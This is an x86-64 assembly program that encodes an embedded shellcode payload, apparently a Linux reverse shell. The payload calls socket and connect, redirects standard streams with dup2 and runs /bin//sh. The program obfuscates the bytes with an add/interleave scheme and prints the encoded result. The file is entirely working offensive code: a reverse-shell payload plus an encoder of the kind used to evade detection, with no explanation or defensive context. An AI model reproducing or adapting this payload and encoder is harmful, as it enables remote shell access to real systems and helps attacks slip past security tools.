global _start

segment .data

    key equ 0x10
    shellcode: db 0x6a, 0x29, 0x58, 0x6a, 0x2, 0x5f, 0x6a, 0x1, 0x5e, 0x99, 0xf, 0x5, 0x48, 0x89, 0xc5, 0x48, 0xb8, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x2, 0x50, 0x48, 0xb8, 0x3, 0x1, 0x1f, 0x60, 0x7e, 0x1, 0x1, 0x3, 0x48, 0x31, 0x4, 0x24, 0x6a, 0x2a, 0x58, 0x48, 0x89, 0xef, 0x6a, 0x10, 0x5a, 0x48, 0x89, 0xe6, 0xf, 0x5, 0x6a, 0x3, 0x5e, 0x48, 0xff, 0xce, 0x78, 0xb, 0x56, 0x6a, 0x21, 0x58, 0x48, 0x89, 0xef, 0xf, 0x5, 0xeb, 0xef, 0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x1, 0x1, 0x81, 0x34, 0x24, 0x1, 0x1, 0x1, 0x1, 0x31, 0xf6, 0x56, 0x6a, 0x8, 0x5e, 0x48, 0x1, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0xf, 0x5, 0x6a, 0x29, 0x58, 0x6a, 0x2, 0x5f, 0x6a, 0x1, 0x5e, 0x99, 0xf, 0x5, 0x48, 0x89, 0xc5, 0x48, 0xb8, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x2, 0x50, 0x48, 0xb8, 0x3, 0x1, 0x1f, 0x60, 0x7e, 0x1, 0x1, 0x3, 0x48, 0x31, 0x4, 0x24, 0x6a, 0x2a, 0x58, 0x48, 0x89, 0xef, 0x6a, 0x10, 0x5a, 0x48, 0x89, 0xe6, 0xf, 0x5, 0x6a, 0x3, 0x5e, 0x48, 0xff, 0xce, 0x78, 0xb, 0x56, 0x6a, 0x21, 0x58, 0x48, 0x89, 0xef, 0xf, 0x5, 0xeb, 0xef, 0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x1, 0x1, 0x81, 0x34, 0x24, 0x1, 0x1, 0x1, 0x1, 0x31, 0xf6, 0x56, 0x6a, 0x8, 0x5e, 0x48, 0x1, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0xf, 0x5
    length equ 242
    half_length equ 121

section .text

_start:

    lea rsi, [shellcode]
    xor rcx, rcx
    xor rbx, rbx
    
    
    add_loop:    
	
	xor ax, ax
	mov al, byte [rsi + rbx + half_length]
	mov dl, byte [rsi + rbx + half_length]
	push rbx
	xor rbx, rbx
	mov bl, key 
	div bl
	xor bl, bl
	pop rbx
	cmp ah, 0x00
	jne add_loop_2

	inc ah
	jmp add_loop_2

    add_loop_2:
	add dl, ah
	mov byte [rsi+rcx], dl
        inc rcx
	mov byte [rsi+rcx], ah
        inc rcx
	inc rbx
        cmp rcx, length
        jne add_loop

    lea rsi, [shellcode]
    mov rdi,0x01
    lea rdx, [length]
    mov rax,0x01
    syscall

    xor rbx, rbx
    mov rax,0x3c
    syscall